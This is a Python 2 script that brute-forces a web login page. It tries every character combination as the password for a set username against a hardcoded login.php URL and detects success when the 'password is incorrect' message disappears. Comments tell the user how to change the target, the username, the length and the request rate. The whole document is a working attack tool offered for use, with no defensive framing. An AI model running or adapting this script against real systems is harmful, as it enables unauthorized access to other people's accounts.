import itertools
from itertools import product
import string
import urllib
import urllib2
import re
import time
# Set password complexity - remove string character sets not required
chars = string.lowercase + string.uppercase + string.digits + string.punctuation
# Set max password length to crack - change 10 to desired length 
for x in range(10):
	for guess in itertools.product((chars), repeat=x):
		i = ''.join(guess)
		# Set user name to crack - change username within single quotes to desired username
		postdata = urllib.urlencode({'username': 'hacker','password': str(i)})
		#uncomment below to debug post data 
		#print postdata
		# Set URL to page receiving login POST data - Change url within single quotes 
		content = urllib2.urlopen('http://10.25.2.81/login.php',postdata).read()
		#uncomment below to debug returned content 
		#print content
		matches = re.findall(r'(?i)password.*?is incorrect.', content)
		#uncomment below to debug regex query
		#print matches
		if len(matches) > 0:
		#uncomment below to debug attempted passwords
			print i + " - is not the password"
			#uncomment below to throttle down script speed - change sleep timer as needed
			#time.sleep(0.1)
			continue
		else:
			print "\n\nPassword found - " + i
			break